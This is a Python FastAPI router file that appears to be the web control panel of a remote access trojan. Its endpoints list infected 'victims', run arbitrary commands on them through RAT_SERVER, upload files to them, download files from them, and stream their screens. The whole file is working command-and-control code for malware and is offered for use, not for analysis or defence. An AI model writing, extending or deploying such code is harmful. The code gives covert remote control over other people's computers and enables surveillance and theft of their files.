from fastapi import Depends, APIRouter, UploadFile, File
from fastapi.responses import HTMLResponse
from auth.dependencies import *
from models.user import User
from host.server import RAT_SERVER
import urllib.parse
import json
from database.clients import get_clients, get_client

app = APIRouter()


@app.get("/clients")
async def read_users_me():
    clients = get_clients()
    if clients is None:
        return {"clients": "Not found"}
    return {"clients": clients}
    # prettyClients = []
    # print(RAT_SERVER.instance.victims)
    # for client in RAT_SERVER.instance.victims:
    #     prettyClients.append(
    #         {"name": client["Name"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    # return {"clients": prettyClients}


@app.get("/clients/{id}")
async def read_user_me(id: str):
    client = get_client(id)
    if client is not None:
        return {"client": client}
    return {"client": "Not found"}


@app.post("/clients/{id}/command")
async def execute_command(id: str, command_type: str, command: str):
    # if current_user:

    print(f"[*] Received command {command} of type {command_type} for {id}")
    command = urllib.parse.unquote(command)

    client = get_client(id)
    if (client == []):
        return {"output": "Error: Client not found"}
    print(id, client)
    RAT_SERVER.instance.execute(command_type, command, client[0].socket_ip)
    output = RAT_SERVER.instance.receive_output(client[0].socket_ip)
    # Turn the string into a JSON
    print(output)
    if output is None or output == "Error receiving output":
        return {"output": {"Error": "Output not received", "result": "Error receiving output"}}
    output = json.loads(output)
    return {"output": output}


@app.post("/clients/{id}/upload")
async def upload_file(id: str, file: UploadFile = File(...)):
    client = get_client(id)

    if (client == []):
        return {"output": "Error: Client not found"}

    await RAT_SERVER.instance.transfer_file(client[0], file)
    return {"output": "File transfer started"}


@app.post("/clients/{id}/download")
async def upload_file(id: str, path: str):
    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)

            await RAT_SERVER.instance.download_file(victim, path)
            return {"output": "File download started"}
    return {"output": "Error: Client not found"}


@app.get("/clients/{id}/screenshare")
async def start_screenshare(id: str):
    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)
            print("Starting screenshare")

            print(victim)

            if (victim["SCREENSHARE_SOURCE"] == ""):
                return {"output": "Error: Screenshare not started"}

            source = victim["SCREENSHARE_SOURCE"]

            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='" + source + "' type='video/mp4'></video>", status_code=200)
    return {"output": "Error: Client not found"}
